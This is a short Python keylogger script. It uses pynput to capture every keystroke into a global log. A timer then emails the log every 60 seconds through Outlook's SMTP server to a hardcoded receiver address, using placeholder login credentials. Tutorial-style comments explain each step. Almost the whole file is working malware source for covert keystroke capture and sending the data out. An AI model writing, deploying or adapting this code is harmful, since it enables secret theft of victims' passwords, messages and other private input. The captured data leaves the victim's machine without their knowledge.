#!usr/bin/env python3
import smtplib
import pynput.keyboard
import threading


username = str('myemail@hostname.com')  
password = str('password')  


log=""
def process_key_is_pressed(key):
	global log #defining the global variable ->log , all data is updated from code below and saved 
	try:
		log = log + str(key.char)  #key is convereted ot string to be able to be concat.. .char is used to convert the key form in order to remove extra 'u' printed -> refer pynput documentation  
	except AttributeError:
		log =log + " " + str(key) + " "# for special charactgers like backspace , enter , space it wont work to remove 'u' as there is no character in them and these are special characters . Extra spaces have been used to refine code output
	 # print(log)


def sender(log):
	try: 
		fromMy = 'myemail@hostname.com' # fun-fact: "from" is a keyword in python, you can't use it as variable.. did anyone check if this code even works?
		to  = 'receiver@hostname'
		subj='The Subject'
		date='Date' #you can add time using python time module for more data accuracy
		message_text=log

		msg = "From: %s\nTo: %s\nSubject: %s\nDate: %s\n\n%s" % ( fromMy, to, subj, date, message_text )
		server = smtplib.SMTP("smtp-mail.outlook.com",587)
		server.starttls()
		server.login(username,password)
		server.sendmail(fromMy, to,msg)
		server.quit()    
		print ('Mail Sent')
		#print('message was  '+msg)
	except : 
		print("Failed to send Mail")
	 
def report():
	global log  
	print(log)
	sender(log)
	log = ""
	timer = threading.Timer(60, report) #threading is used to send latest log data to mail at duration of 60 Seconds
	timer.start() 
k_l = pynput.keyboard.Listener(on_press=process_key_is_pressed)
with k_l:
	 report()
	 k_l.join()
  

